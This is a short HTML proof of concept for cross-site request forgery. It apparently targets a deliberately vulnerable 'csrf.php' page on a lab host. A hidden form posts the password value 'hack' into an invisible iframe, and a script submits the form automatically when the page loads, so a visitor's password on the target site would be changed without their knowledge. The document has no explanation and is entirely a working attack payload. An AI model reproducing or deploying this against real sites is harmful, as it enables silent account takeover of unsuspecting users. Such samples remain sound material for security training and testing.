<iframe name="hidden" style="display: none"></iframe>
<form action="http://web-master/vuln/else/csrf.php" method="POST"
    target="hidden">
    <input type="hidden" name="password" value="hack">

</form>
<div>
    <img src="x">
</div>
<script>
    document.forms[0].submit();
</script>